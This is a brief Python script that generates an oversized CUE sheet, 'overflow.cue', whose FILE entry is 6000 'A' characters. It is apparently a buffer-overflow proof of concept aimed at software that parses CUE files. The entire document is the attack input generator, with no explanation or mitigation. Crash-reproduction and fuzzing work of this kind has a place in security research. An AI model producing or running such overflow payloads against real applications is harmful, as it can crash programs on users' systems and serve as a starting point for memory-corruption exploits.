import os

payload = "A" * 6000

base_dir = os.path.dirname(__file__)
out_path = os.path.join(base_dir, "overflow.cue")

with open(out_path, "w") as f:
    f.write(f'FILE "{payload}" BINARY\n')
    f.write("  TRACK 01 MODE1/2352\n")
    f.write("    INDEX 01 00:00:00\n")
